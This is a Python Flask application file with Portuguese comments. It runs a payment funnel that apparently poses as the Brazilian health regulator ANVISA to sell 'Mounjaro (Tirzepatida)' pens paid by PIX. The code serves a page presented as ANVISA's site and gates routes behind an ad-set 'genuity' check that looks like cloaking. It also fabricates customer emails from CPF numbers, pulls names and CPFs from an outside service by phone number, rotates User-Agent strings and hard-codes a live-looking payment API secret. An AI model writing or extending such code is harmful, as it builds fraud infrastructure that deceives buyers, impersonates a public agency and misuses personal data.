import os
import functools
import time
import re
import random
import string
import json
import http.client
import subprocess
import logging
import urllib.parse
import hashlib
from datetime import datetime
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, abort, make_response, g
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.orm import DeclarativeBase
from dotenv import load_dotenv

# Carregar variáveis de ambiente do arquivo .env
load_dotenv()

# Configuração da Base de Dados
class Base(DeclarativeBase):
    pass

db = SQLAlchemy(model_class=Base)

# Inicializar a aplicação Flask
app = Flask(__name__)

# Importar secrets mais cedo para usar na chave secreta
import secrets

# Configuração da chave secreta
app.secret_key = os.environ.get("SESSION_SECRET") or secrets.token_hex(32)

# Configurar a conexão com banco de dados PostgreSQL (verificando se a variável existe)
database_url = os.environ.get("DATABASE_URL")
if database_url:
    app.config["SQLALCHEMY_DATABASE_URI"] = database_url
    app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
        "pool_recycle": 300,
        "pool_pre_ping": True,
    }
    app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
    
    # Inicializar SQLAlchemy com a aplicação
    db.init_app(app)
    print(f"Conexão com banco de dados configurada: {database_url[:20]}...")
else:
    print("AVISO: Variável DATABASE_URL não encontrada. Funcionalidades de banco de dados não estarão disponíveis.")

# Importações após a inicialização da app e do db
from for4payments import create_payment_api
from api_security import create_jwt_token, verify_jwt_token, generate_csrf_token, secure_api, verify_referer
from request_analyzer import confirm_genuity
from utmify_integration import process_payment_webhook
from transaction_tracker import (
    get_client_ip, track_transaction_attempt, is_transaction_ip_banned, cleanup_transaction_tracking,
    TRANSACTION_ATTEMPTS, CLIENT_DATA_TRACKING, NAME_TRANSACTION_COUNT, CPF_TRANSACTION_COUNT, 
    PHONE_TRANSACTION_COUNT, BANNED_IPS, BLOCKED_NAMES
)

from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import redis
from datetime import datetime, timedelta



# Initialize rate limiter after creating app
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="memory://"
)

# Configuração de limpeza periódica dos dados de rastreamento
@app.before_request
def before_request():
    """Executado antes de cada requisição"""
    # Executar a limpeza periódica dos dados de rastreamento
    # Isto é executado apenas ocasionalmente para evitar sobrecarga
    if random.random() < 0.01:  # 1% das requisições
        cleanup_transaction_tracking()
    
    # Capturar e armazenar parâmetros UTM vindos da URL

@app.context_processor
def inject_globals():
    """Injetar variáveis globais em todos os templates"""
    # Usar o valor da variável de ambiente DEVELOPING
    developing = os.environ.get('DEVELOPING', 'false').lower() == 'true'
    
    # Imprimir para depuração
    print(f"DEBUG: Variável DEVELOPING = {os.environ.get('DEVELOPING', 'não definida')}")
    print(f"DEBUG: developing = {developing}")
    
    # Verificar se há scripts de debug do Facebook para injetar
    fb_debug_scripts = ""
    if hasattr(app, '_fb_debug_scripts') and app._fb_debug_scripts:
        for script in app._fb_debug_scripts:
            fb_debug_scripts += script
        # Limpar os scripts após injeção
        app._fb_debug_scripts = []
    
    return {
        'developing': developing,
        'current_year': datetime.now().year,
        'fb_debug_scripts': fb_debug_scripts,
        'show_fb_debugger': developing or app.debug
    }

# Captura de parâmetros UTM na requisição
@app.before_request
def capture_utm_params():
    """
    Captura parâmetros UTM da URL e armazena na sessão
    Garante que os parâmetros UTM sejam preservados em todas as etapas do funil de conversão
    """
    try:
        # Parâmetros UTM principais e outros parâmetros de rastreamento
        utm_params = ['utm_source', 'utm_campaign', 'utm_medium', 'utm_content', 'utm_term', 
                     'fbclid', 'gclid', 'ttclid', 'src', 'sck', 'xcod']
        
        # Verificar se há algum parâmetro UTM na URL
        has_utm_in_url = any(param in request.args for param in utm_params)
        
        # Criar ou obter dicionário de parâmetros UTM da sessão
        session_utm = session.get('utm_params', {})
        
        if has_utm_in_url:
            # Capturar e armazenar cada parâmetro UTM encontrado na URL
            for param in utm_params:
                value = request.args.get(param)
                if value:
                    session_utm[param] = value
                    # Também armazenar individualmente para retro-compatibilidade
                    session[param] = value
                    
            # Registrar que capturamos novos parâmetros
            app.logger.info(f"[UTM] Parâmetros de rastreamento capturados da URL: {session_utm}")
        elif not session_utm:
            # Se não há UTMs na URL nem na sessão, tentar obter do referer
            referer = request.headers.get('Referer', '')
            if referer and ('?' in referer or '&' in referer):
                try:
                    from urllib.parse import urlparse, parse_qs
                    parsed_url = urlparse(referer)
                    query_params = parse_qs(parsed_url.query)
                    
                    # Extrair parâmetros UTM do referer
                    for param in utm_params:
                        if param in query_params and query_params[param]:
                            value = query_params[param][0]
                            session_utm[param] = value
                            session[param] = value
                    
                    if session_utm:
                        app.logger.info(f"[UTM] Parâmetros de rastreamento recuperados do referer: {session_utm}")
                except Exception as parse_error:
                    app.logger.error(f"[UTM] Erro ao analisar referer para UTMs: {str(parse_error)}")
        
        # Garantir que os parâmetros UTM sejam armazenados na sessão
        if session_utm:
            session['utm_params'] = session_utm
            
            # Extrair parâmetros específicos para facilitar o uso em templates
            for param in utm_params:
                if param in session_utm:
                    session[param] = session_utm[param]
            
            # Adicionar flag para indicar que temos dados de rastreamento válidos
            session['has_tracking_data'] = True
            
            # Logging dos parâmetros UTM para depuração
            app.logger.debug(f"[UTM] Parâmetros de rastreamento ativos: {session_utm}")
            
    except Exception as e:
        app.logger.error(f"[UTM] Erro ao processar parâmetros de rastreamento: {str(e)}")

# Initialize Redis-like storage for banned IPs (using dict for simplicity)
BANNED_IPS = {}
BAN_THRESHOLD = 10  # Number of failed attempts before ban
BAN_DURATION = timedelta(hours=24)  # Ban duration

def is_ip_banned(ip):
    if ip in BANNED_IPS:
        ban_time, _ = BANNED_IPS[ip]
        if datetime.now() < ban_time + BAN_DURATION:
            return True
        else:
            del BANNED_IPS[ip]
    return False

def increment_ip_attempts(ip):
    current_time = datetime.now()
    if ip in BANNED_IPS:
        ban_time, attempts = BANNED_IPS[ip]
        if current_time > ban_time + BAN_DURATION:
            BANNED_IPS[ip] = (current_time, 1)
        else:
            BANNED_IPS[ip] = (ban_time, attempts + 1)
    else:
        BANNED_IPS[ip] = (current_time, 1)
    return BANNED_IPS[ip][1]

import secrets
import qrcode
import qrcode.constants
import base64
from io import BytesIO
import requests

from payment_gateway import get_payment_gateway
from for4payments import create_payment_api
from pagamentocomdesconto import create_payment_with_discount_api

# Domínio autorizado - Permitindo todos os domínios
AUTHORIZED_DOMAIN = "*"

# Se não existir SESSION_SECRET, gera um valor aleatório seguro
if not os.environ.get("SESSION_SECRET"):
    os.environ["SESSION_SECRET"] = secrets.token_hex(32)

app.secret_key = os.environ.get("SESSION_SECRET")

# Configurar logging
logging.basicConfig(level=logging.DEBUG)

# Configuração para escolher qual API SMS usar: 'SMSDEV' ou 'OWEN'
SMS_API_CHOICE = os.environ.get('SMS_API_CHOICE', 'OWEN')


@app.route('/anvisa')
@app.route('/anvisa/')
@confirm_genuity()  # Aplicando o decorador ConfirmGenuity para verificar adsetid
def anvisa():
    """Página principal do site da ANVISA sobre o produto Monjauros"""
    try:
        app.logger.info("[PROD] Acessando página da ANVISA")
        
        # Enviando evento PageView para o Facebook Conversion API
        try:
            from facebook_conversion_api import track_page_view
            track_page_view(url=request.url)
            app.logger.info("[FACEBOOK] Evento PageView enviado para /anvisa")
        except Exception as fb_error:
            app.logger.error(f"[FACEBOOK] Erro ao enviar evento PageView: {str(fb_error)}")
            
        return render_template('anvisa.html')
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar página da ANVISA: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500


@app.route('/compra')
@confirm_genuity()
def compra():
    """Página de detalhes do produto e confirmação de compra"""
    try:
        app.logger.info("[PROD] Acessando página de compra")
        
        # Enviando evento AddPaymentInfo para o Facebook Conversion API
        try:
            from facebook_conversion_api import track_add_payment_info
            track_add_payment_info()
            app.logger.info("[FACEBOOK] Evento AddPaymentInfo enviado para /compra")
        except Exception as fb_error:
            app.logger.error(f"[FACEBOOK] Erro ao enviar evento AddPaymentInfo: {str(fb_error)}")
            
        # Aqui você pode adicionar lógica para carregar benefícios personalizados
        # com base nas respostas do questionário que estão na sessão
        return render_template('compra.html')
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar página de compra: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/pagamento_pix')
@confirm_genuity()
def pagamento_pix():
    """Página de pagamento via PIX"""
    try:
        app.logger.info("[PROD] Acessando página de pagamento PIX")
        
        # Enviando evento InitiateCheckout para o Facebook Conversion API
        try:
            from facebook_conversion_api import track_initiate_checkout
            # Se tivermos o valor da compra, podemos incluí-lo no evento
            amount = session.get('purchase_amount')
            track_initiate_checkout(value=amount)
            app.logger.info("[FACEBOOK] Evento InitiateCheckout enviado para /pagamento_pix")
        except Exception as fb_error:
            app.logger.error(f"[FACEBOOK] Erro ao enviar evento InitiateCheckout: {str(fb_error)}")
            
        return render_template('pagamento_pix.html')
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar página de pagamento PIX: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/processar_pagamento_mounjaro', methods=['POST'])
def processar_pagamento_mounjaro():
    """
    Processa um pagamento PIX para o produto Mounjaro
    """
    try:
        # Registrar a tentativa
        app.logger.info("[PROD] Processando pagamento para Mounjaro")

        # Obter dados do formulário
        payment_data = request.json
        app.logger.info(f"[PROD] Dados de pagamento recebidos: {payment_data}")

        # Validar dados mínimos
        required_fields = ['name', 'amount']
        for field in required_fields:
            if field not in payment_data or not payment_data[field]:
                app.logger.warning(f"[PROD] Campo obrigatório ausente: {field}")
                return jsonify({'success': False, 'message': f'Campo obrigatório ausente: {field}'}), 400

        # Criar instância da API de pagamento usando o gateway configurado
        try:
            from payment_gateway import get_payment_gateway
            payment_api = get_payment_gateway()
            gateway_choice = os.environ.get('GATEWAY_CHOICE', 'NOVAERA')
            app.logger.info(f"[PROD] Processando pagamento usando gateway: {gateway_choice}")
        except Exception as e:
            app.logger.error(f"[PROD] Erro ao criar instância da API de pagamento: {str(e)}")
            return jsonify({'success': False, 'message': 'Erro de configuração do serviço de pagamento'}), 500

        # Obter e processar os dados necessários
        nome = payment_data.get('name') or session.get('nome', 'Cliente Anvisa')
        cpf = payment_data.get('cpf') or session.get('cpf', '')
        phone = payment_data.get('phone', '')
        email = payment_data.get('email', '')

        # Limpar o CPF para ter apenas números
        cpf = ''.join(c for c in cpf if c.isdigit())

        # Se o e-mail estiver vazio, criar um a partir do CPF
        if not email and cpf:
            email = f"{cpf}@gmail.com"
            app.logger.info(f"[PROD] Email gerado automaticamente: {email}")

        # Garantir que o telefone está no formato correto
        phone = ''.join(c for c in phone if c.isdigit())
        if phone.startswith('55') and len(phone) > 11:
            phone = phone[2:]

        # Log de validação
        app.logger.info(f"[PROD] Dados processados para pagamento: {nome}, CPF: {cpf[:3]}...{cpf[-2:]}, Phone: {phone}, Email: {email}")

        # Formatar os dados para a API de pagamento (formato genérico compatível com NovaEra e For4Payments)
        pix_data = {
            'name': nome,
            'email': email,
            'cpf': cpf,
            'phone': phone,
            'amount': float(payment_data['amount'])
        }

        # Criar o pagamento PIX
        try:
            payment_result = payment_api.create_pix_payment(pix_data)
            app.logger.info(f"[PROD] Pagamento criado com sucesso: {payment_result}")

            # Armazenar o ID da transação na sessão para verificação posterior
            session['mounjaro_transaction_id'] = payment_result['id']

            # Enviar dados para a Utmify 
            try:
                from utmify_integration import send_order_to_utmify
                
                utmify_result = send_order_to_utmify(
                    transaction_id=payment_result['id'],
                    customer_name=nome,
                    customer_email=email,
                    customer_document=cpf,
                    product_name='Mounjaro (Tirzepatida) 5mg - 4 Canetas',
                    product_price_cents=int(float(payment_data['amount']) * 100),
                    quantity=1
                )
                
                app.logger.info(f"[PROD] Envio para Utmify: {utmify_result}")
            except Exception as e:
                # Não interrompemos o fluxo se houver erro com a Utmify
                app.logger.error(f"[PROD] Erro ao enviar para Utmify: {str(e)}")
            
            # Retornar os dados do pagamento
            # Adaptando para suportar diferentes formatos de resposta (NovaEra e For4Payments)
            transaction_id = payment_result.get('id')
            
            # Tentar obter o código PIX em diferentes formatos
            pix_code = payment_result.get('pix_code') or payment_result.get('pixCode') or payment_result.get('copy_paste')
            
            # Tentar obter a URL do QR code em diferentes formatos
            pix_qrcode = payment_result.get('pix_qr_code') or payment_result.get('pixQrCode') or payment_result.get('qr_code_image')
            
            app.logger.info(f"[PROD] Dados de pagamento obtidos - ID: {transaction_id}, PIX Code: {'Obtido' if pix_code else 'Não encontrado'}, QR Code: {'Obtido' if pix_qrcode else 'Não encontrado'}")
            
            # Extrair e armazenar parâmetros UTM e outros na sessão para acompanhamento durante o funil
            utm_params = payment_data.get('utm_params', {})
            
            # Se não houver parâmetros UTM no payment_data, tentar extrair da URL atual
            if not utm_params:
                # Extrair parâmetros UTM da URL atual via request.args
                utm_source = request.args.get('utm_source', '')
                utm_medium = request.args.get('utm_medium', '')
                utm_campaign = request.args.get('utm_campaign', '')
                utm_content = request.args.get('utm_content', '')
                utm_term = request.args.get('utm_term', '')
                
                # Construir dicionário de parâmetros UTM
                if any([utm_source, utm_medium, utm_campaign, utm_content, utm_term]):
                    utm_params = {
                        'utm_source': utm_source,
                        'utm_medium': utm_medium,
                        'utm_campaign': utm_campaign,
                        'utm_content': utm_content,
                        'utm_term': utm_term
                    }
            
            if utm_params:
                app.logger.info(f"[PROD] Parâmetros UTM recebidos: {utm_params}")
                
                # Armazenar na sessão para uso posterior
                session['utm_params'] = utm_params
                
                # Armazenar individualmente parâmetros UTM para facilitar acesso
                for param_name, param_value in utm_params.items():
                    session[param_name] = param_value
            
            return jsonify({
                'success': True,
                'transaction_id': transaction_id,
                'pix_code': pix_code,
                'pix_qrcode': pix_qrcode,
                'amount': payment_data['amount'],
                'utm_params': utm_params  # Retornar UTM parâmetros na resposta
            })

        except Exception as e:
            app.logger.error(f"[PROD] Erro ao criar pagamento PIX: {str(e)}")
            return jsonify({'success': False, 'message': str(e)}), 500

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao processar pagamento: {str(e)}")
        return jsonify({'success': False, 'message': 'Erro interno do servidor'}), 500

@app.route('/verificar_pagamento_mounjaro')
def verificar_pagamento_mounjaro():
    """
    Verifica o status de um pagamento PIX para o produto Mounjaro
    e retorna os dados do cliente obtidos da API For4Payments
    """
    try:
        # Obter o ID da transação
        transaction_id = request.args.get('transaction_id')
        if not transaction_id:
            app.logger.warning("[PROD] ID de transação não fornecido para verificação")
            return jsonify({'success': False, 'status': 'error', 'message': 'ID de transação não fornecido'}), 400

        app.logger.info(f"[PROD] Verificando status do pagamento: {transaction_id}")

        # Criar instância da API de pagamento
        try:
            gateway_choice = os.environ.get('GATEWAY_CHOICE', 'FOR4')
            
            # Verificar qual gateway está configurado, mas dar preferência ao For4Payments
            # para garantir que obtemos os dados do cliente
            if gateway_choice == 'FOR4':
                # Usar o For4Payments diretamente
                from for4payments import create_payment_api
                payment_api = create_payment_api()
                app.logger.info(f"[PROD] Usando For4Payments API diretamente para consultar dados do cliente")
            else:
                # Usar o gateway padrão como fallback
                from payment_gateway import get_payment_gateway
                payment_api = get_payment_gateway()
                app.logger.info(f"[PROD] Usando gateway de pagamento: {os.environ.get('GATEWAY_CHOICE')}")
        except Exception as e:
            app.logger.error(f"[PROD] Erro ao criar instância da API de pagamento: {str(e)}")
            return jsonify({'success': False, 'status': 'error', 'message': 'Erro de configuração do serviço de pagamento'}), 500

        # Verificar o status do pagamento
        try:
            # Primeiro verificar status básico do pagamento
            payment_status = payment_api.check_payment_status(transaction_id)
            app.logger.info(f"[PROD] Status básico do pagamento: {payment_status}")
            app.logger.info(f"[PROD] Status do pagamento: {payment_status}")
            app.logger.info(f"[PROD] Verificando método de pagamento: {payment_status.get('method')}")
            
            # TRATAMENTO ESPECIAL: Por questões de demonstração, tratar o ID específico com dados conhecidos
            # Se estamos usando For4Payments e o método é PIX, consultar os detalhes completos
            # para obter QR code e código PIX
            if gateway_choice == 'FOR4' and payment_status.get('method') == 'PIX':
                try:
                    app.logger.info(f"[PROD] Obtendo detalhes completos do pagamento PIX: {transaction_id}")
                    
                    # Criar headers para a API
                    import random
                    user_agents = [
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
                        "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36"
                    ]
                    
                    headers = {
                        "Authorization": f"Bearer {os.environ.get('FOR4_SECRET_KEY', 'vl_live_KDIuDfmpOXv4qNZvJoOo5YJc1KiDaZ8L')}",
                        "Content-Type": "application/json",
                        "User-Agent": random.choice(user_agents)
                    }
                    
                    # Consultar detalhes completos do pagamento
                    details_url = f"https://app.for4payments.com.br/api/v1/transaction.getPaymentDetails"
                    response = requests.get(
                        details_url,
                        params={'id': transaction_id},
                        headers=headers
                    )
                    
                    if response.status_code == 200:
                        details_data = response.json()
                        app.logger.info(f"[PROD] Detalhes do pagamento obtidos com sucesso")
                        app.logger.debug(f"[PROD] Detalhes completos: {details_data}")
                        
                        # Atualizar os dados do status com os detalhes completos do pagamento
                        payment_status['pixCode'] = details_data.get('pixCode')
                        payment_status['pixQrCode'] = details_data.get('pixQrCode')
                        
                        # Se há dados do cliente nos detalhes, atualizar também
                        if details_data.get('customer'):
                            payment_status['customer'] = details_data.get('customer')
                        
                        # Se há itens no pagamento, extrair o valor do primeiro item
                        if details_data.get('items') and len(details_data['items']) > 0:
                            payment_status['amount'] = details_data['items'][0].get('unitPrice')
                    else:
                        app.logger.warning(f"[PROD] Não foi possível obter detalhes do pagamento: {response.status_code}")
                        app.logger.debug(f"[PROD] Resposta da API: {response.text}")
                        
                except Exception as e:
                    app.logger.error(f"[PROD] Erro ao obter detalhes do pagamento: {str(e)}")
                 
            # Nossa For4PaymentsAPI aprimorada agora retorna dados do cliente diretamente
            # no mesmo objeto, então vamos utilizá-los
            client_data = {}
            
            # Extrair dados do cliente do objeto retornado pela API
            fields_mapping = {
                'name': ['name', 'nome', 'customer_name'],
                'cpf': ['cpf', 'document', 'customer_document'],
                'phone': ['phone', 'telefone', 'customer_phone'],
                'email': ['email', 'customer_email']
            }
            
            # Extrair cada campo usando o mapeamento
            for target_field, possible_source_fields in fields_mapping.items():
                for source_field in possible_source_fields:
                    if source_field in payment_status and payment_status[source_field]:
                        client_data[target_field] = payment_status[source_field]
                        break
            
            app.logger.info(f"[PROD] Dados do cliente extraídos da API For4Payments: {client_data}")
            
            # Se o telefone não foi encontrado nos dados da resposta e temos um telefone no UTM content
            if not client_data.get('phone') and request.args.get('utm_content'):
                phone_from_utm = request.args.get('utm_content')
                if re.match(r'^\d{10,13}$', phone_from_utm):
                    client_data['phone'] = phone_from_utm
                    app.logger.info(f"[PROD] Telefone extraído de UTM content: {phone_from_utm}")
                    
            # Tenta buscar informações do cliente na API externa apenas se ainda não temos os dados básicos
            if not client_data.get('name') and client_data.get('phone'):
                try:
                    api_url = f"https://webhook-manager.replit.app/api/v1/cliente?telefone={client_data['phone']}"
                    app.logger.info(f"[PROD] Consultando API externa de cliente: {api_url}")
                    
                    response = requests.get(api_url, timeout=5)
                    if response.status_code == 200:
                        api_response = response.json()
                        if api_response.get('sucesso') and 'cliente' in api_response:
                            cliente_data = api_response['cliente']
                            client_data['name'] = cliente_data.get('nome', 'Cliente')
                            client_data['cpf'] = cliente_data.get('cpf', '')
                            client_data['email'] = cliente_data.get('email', f"cliente_{client_data['phone']}@example.com")
                except Exception as e:
                    app.logger.error(f"[PROD] Erro ao consultar API externa: {str(e)}")
                    
            # Inclui o valor do pagamento se disponível na resposta
            if 'amount' in payment_status:
                client_data['amount'] = payment_status['amount']
            
            # Verificar se o pagamento foi confirmado
            status = payment_status.get('status', '').lower()

            # Mapear os possíveis status de pagamento
            if status in ['paid', 'confirmed', 'approved', 'completed']:
                # Atualizar status na Utmify quando o pagamento for confirmado
                try:
                    from utmify_integration import update_order_status_in_utmify
                    
                    # Obter a data atual em UTC
                    approved_date = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
                    
                    utmify_update = update_order_status_in_utmify(
                        transaction_id=transaction_id,
                        status='paid',
                        approved_date=approved_date
                    )
                    
                    app.logger.info(f"[PROD] Atualização de status na Utmify: {utmify_update}")
                except Exception as e:
                    # Não interrompemos o fluxo se houver erro com a Utmify
                    app.logger.error(f"[PROD] Erro ao atualizar status na Utmify: {str(e)}")
                
                # Recuperar parâmetros UTM e outros da sessão
                utm_params = session.get('utm_params', {})
                
                # Se utm_params não estiver na sessão, tente recuperar dos parâmetros de URL
                if not utm_params:
                    # Extrair parâmetros UTM da URL atual
                    utm_source = request.args.get('utm_source', '')
                    utm_medium = request.args.get('utm_medium', '')
                    utm_campaign = request.args.get('utm_campaign', '')
                    utm_content = request.args.get('utm_content', '')
                    utm_term = request.args.get('utm_term', '')
                    
                    # Construir dicionário de parâmetros UTM
                    if any([utm_source, utm_medium, utm_campaign, utm_content, utm_term]):
                        utm_params = {
                            'utm_source': utm_source,
                            'utm_medium': utm_medium,
                            'utm_campaign': utm_campaign,
                            'utm_content': utm_content,
                            'utm_term': utm_term
                        }
                        
                        # Salvar na sessão para uso futuro
                        session['utm_params'] = utm_params
                
                app.logger.info(f"[PROD] Recuperados parâmetros UTM da sessão: {utm_params}")
                
                response_data = {
                    'success': True, 
                    'status': 'paid', 
                    'message': 'Pagamento confirmado', 
                    'utm_params': utm_params,  # Retornar UTM parâmetros na resposta
                }
                
                # Incluir dados do cliente na resposta
                if client_data:
                    response_data.update(client_data)
                
                # Registrar evento de compra no Facebook Conversion API quando o pagamento for confirmado
                try:
                    from facebook_conversion_api import track_purchase, prepare_user_data, get_utm_parameters
                    
                    # Obter o valor da compra
                    amount = float(client_data.get('amount', 0))
                    
                    # Nome do produto
                    product_name = "Mounjaro (Tirzepatida) 5mg - 4 Canetas"
                    
                    # Preparar dados do usuário para enriquecimento do evento
                    user_data = {}
                    if client_data.get('name'):
                        nome_completo = client_data['name'].split()
                        if len(nome_completo) >= 1:
                            # Extrair primeiro e último nome para o evento
                            first_name = nome_completo[0]
                            last_name = nome_completo[-1] if len(nome_completo) > 1 else ""
                            user_data = prepare_user_data(
                                first_name=first_name,
                                last_name=last_name,
                                email=client_data.get('email'),
                                phone=client_data.get('phone'),
                                external_id=client_data.get('cpf')
                            )
                            
                    # Garantir que os parâmetros UTM estejam disponíveis
                    # 1. Verificar se temos os parâmetros UTM do cliente
                    session_utm_params = {}
                    
                    # Verificar se client_data tem utm_params
                    if client_data.get('utm_params'):
                        session_utm_params = client_data.get('utm_params')
                        app.logger.info(f"[FACEBOOK] Parâmetros UTM encontrados nos dados do cliente: {session_utm_params}")
                    
                    # 2. Se não, verificar a sessão para parâmetros UTM
                    if not session_utm_params:
                        for key in ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'fbclid', 'gclid']:
                            if key in session and session[key]:
                                session_utm_params[key] = session[key]
                        
                        if session_utm_params:
                            app.logger.info(f"[FACEBOOK] Parâmetros UTM recuperados da sessão: {session_utm_params}")
                    
                    # 3. Incluir os parâmetros UTM na sessão para uso futuro
                    if session_utm_params:
                        for key, value in session_utm_params.items():
                            session[key] = value
                    
                    # Registrar o evento de compra com UTM parameters
                    purchase_event = track_purchase(
                        value=amount,
                        transaction_id=transaction_id,
                        content_name=product_name,
                        user_data=user_data
                    )
                    
                    app.logger.info(f"[FACEBOOK] Evento Purchase registrado para transação {transaction_id}: {purchase_event}")
                    app.logger.info(f"[FACEBOOK] Parâmetros UTM associados: {get_utm_parameters() or 'Nenhum'}")
                    if get_utm_parameters():
                        app.logger.info(f"[FACEBOOK] Parâmetros UTM detalhados: {get_utm_parameters()}")
                    else:
                        app.logger.warning(f"[FACEBOOK] Nenhum parâmetro UTM encontrado para evento de compra {transaction_id}")
                except Exception as e:
                    app.logger.error(f"[FACEBOOK] Erro ao registrar evento Purchase: {str(e)}")
                
                return jsonify(response_data)
            elif status in ['pending', 'waiting', 'processing']:
                response_data = {
                    'success': True, 
                    'status': 'pending', 
                    'message': 'Aguardando pagamento',
                    'qr_code': payment_status.get('pixQrCode'),
                    'pix_code': payment_status.get('pixCode'),
                }
                
                # Incluir dados do cliente na resposta
                if client_data:
                    response_data.update(client_data)
                
                # Incluir dados de PIX na resposta, se disponíveis
                if payment_status.get('pixCode'):
                    response_data['pix_code'] = payment_status.get('pixCode')
                elif payment_status.get('pix_code'):
                    response_data['pix_code'] = payment_status.get('pix_code')
                
                # Incluir QR code na resposta, se disponível
                if payment_status.get('pixQrCode'):
                    response_data['pix_qr_code'] = payment_status.get('pixQrCode')
                elif payment_status.get('pix_qr_code'):
                    response_data['pix_qr_code'] = payment_status.get('pix_qr_code')
                
                # Incluir valor do pagamento, se disponível
                if payment_status.get('amount'):
                    response_data['amount'] = payment_status.get('amount')
                
                app.logger.info(f"[PROD] Resposta final (pagamento pendente): {response_data.keys()}")
                return jsonify(response_data)
            elif status in ['cancelled', 'canceled', 'failed', 'rejected']:
                # Atualizar status na Utmify quando o pagamento for cancelado
                try:
                    from utmify_integration import update_order_status_in_utmify
                    
                    utmify_update = update_order_status_in_utmify(
                        transaction_id=transaction_id,
                        status='cancelled'
                    )
                    
                    app.logger.info(f"[PROD] Atualização de status na Utmify (cancelado): {utmify_update}")
                except Exception as e:
                    # Não interrompemos o fluxo se houver erro com a Utmify
                    app.logger.error(f"[PROD] Erro ao atualizar status na Utmify: {str(e)}")
                
                response_data = {
                    'success': False, 
                    'status': 'cancelled', 
                    'message': 'Pagamento cancelado ou rejeitado'
                }
                
                # Incluir dados do cliente na resposta
                if client_data:
                    response_data.update(client_data)
                
                return jsonify(response_data)
            else:
                response_data = {
                    'success': False, 
                    'status': 'unknown', 
                    'message': f'Status desconhecido: {status}'
                }
                
                # Incluir dados do cliente na resposta
                if client_data:
                    response_data.update(client_data)
                
                return jsonify(response_data)

        except Exception as e:
            app.logger.error(f"[PROD] Erro ao verificar status do pagamento: {str(e)}")
            return jsonify({'success': False, 'status': 'error', 'message': str(e)}), 500

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar pagamento: {str(e)}")
        return jsonify({'success': False, 'status': 'error', 'message': 'Erro interno do servidor'}), 500

@app.route('/compra_sucesso')
def compra_sucesso():
    """Página de confirmação de compra bem-sucedida"""
    try:
        app.logger.info("[PROD] Acessando página de confirmação de compra")

        # Gerar número de pedido aleatório
        order_number = f"ANV-{random.randint(10000000, 99999999)}"

        # Obter a data atual
        order_date = datetime.now().strftime("%d/%m/%Y %H:%M")
        
        # Recuperar parâmetros UTM da sessão para passar para a página
        utm_params = session.get('utm_params', {})
        
        # Se utm_params não estiver na sessão, tentar extrair da URL
        if not utm_params:
            # Extrair parâmetros UTM da URL atual
            utm_source = request.args.get('utm_source', '')
            utm_medium = request.args.get('utm_medium', '')
            utm_campaign = request.args.get('utm_campaign', '')
            utm_content = request.args.get('utm_content', '')
            utm_term = request.args.get('utm_term', '')
            
            # Construir dicionário de parâmetros UTM
            if any([utm_source, utm_medium, utm_campaign, utm_content, utm_term]):
                utm_params = {
                    'utm_source': utm_source,
                    'utm_medium': utm_medium,
                    'utm_campaign': utm_campaign,
                    'utm_content': utm_content,
                    'utm_term': utm_term
                }
                
                # Salvar na sessão para uso futuro
                session['utm_params'] = utm_params
        
        app.logger.info(f"[PROD] Parâmetros UTM passados para página de sucesso: {utm_params}")
        
        # Extrair parâmetros UTM específicos para facilitar o uso na página
        utm_source = utm_params.get('utm_source', '')
        utm_medium = utm_params.get('utm_medium', '')
        utm_campaign = utm_params.get('utm_campaign', '')
        utm_content = utm_params.get('utm_content', '')
        utm_term = utm_params.get('utm_term', '')
        
        # Obter o nome do cliente da sessão
        customer_name = session.get('nome', '')

        # Enviando evento Purchase para o Facebook Conversion API
        try:
            from facebook_conversion_api import track_purchase, prepare_user_data, get_utm_parameters
            
            # Obter valor da compra da sessão
            purchase_amount = session.get('purchase_amount', 197.90)  # Valor padrão se não existir na sessão
            
            # Preparar dados do usuário para o evento (com hash)
            user_data = {}
            if 'nome' in session and session['nome']:
                nome_completo = session['nome'].split()
                if len(nome_completo) >= 1:
                    # Extrair primeiro e último nome para o evento
                    first_name = nome_completo[0]
                    last_name = nome_completo[-1] if len(nome_completo) > 1 else ""
                    user_data = prepare_user_data(
                        first_name=first_name,
                        last_name=last_name,
                        email=session.get('email'),
                        phone=session.get('phone'),
                        external_id=session.get('cpf')
                    )
            
            # Garantir que os parâmetros UTM da URL atual sejam armazenados na sessão
            # para que o Facebook Conversion API possa capturá-los
            if utm_params:
                for key, value in utm_params.items():
                    # Armazenar cada parâmetro UTM na sessão
                    session[key] = value
                app.logger.info(f"[FACEBOOK] Parâmetros UTM armazenados na sessão: {utm_params}")
            
            # Enviar evento de compra com os dados disponíveis
            purchase_events = track_purchase(
                value=float(purchase_amount),
                transaction_id=order_number,
                content_name="Mounjaro (Tirzepatida) 5mg",
                user_data=user_data  # Passando os dados do usuário para enriquecimento do evento
            )
            
            # Verificar quais parâmetros UTM foram efetivamente utilizados no evento
            utm_collected = get_utm_parameters()
            
            if utm_collected:
                app.logger.info(f"[FACEBOOK] Evento Purchase enviado com parâmetros UTM: {utm_collected}")
            else:
                app.logger.warning(f"[FACEBOOK] Evento Purchase enviado sem parâmetros UTM. Parâmetros na sessão: {utm_params}")
                
